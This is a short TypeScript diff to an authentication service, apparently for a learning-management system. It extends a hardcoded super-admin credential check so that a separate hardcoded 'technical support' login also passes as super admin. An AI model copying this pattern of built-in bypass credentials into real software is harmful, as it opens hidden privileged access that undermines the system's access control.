@@ -196,9 +196,14 @@ export class AuthService {
   }
 
   private matchesHardcodedSuperAdmin(credentials: LmsLoginDto): boolean {
+    const username = credentials.username.trim().toLowerCase();
+    const isPrimarySuperAdmin =
+      username === SUPER_ADMIN_USERNAME &&
+      credentials.password === SUPER_ADMIN_PASSWORD;
+
     return (
-      credentials.username.trim().toLowerCase() === SUPER_ADMIN_USERNAME &&
-      credentials.password === SUPER_ADMIN_PASSWORD
+      isPrimarySuperAdmin ||
+      this.matchesHardcodedTechnicalSupport(credentials)
     );
   }
 
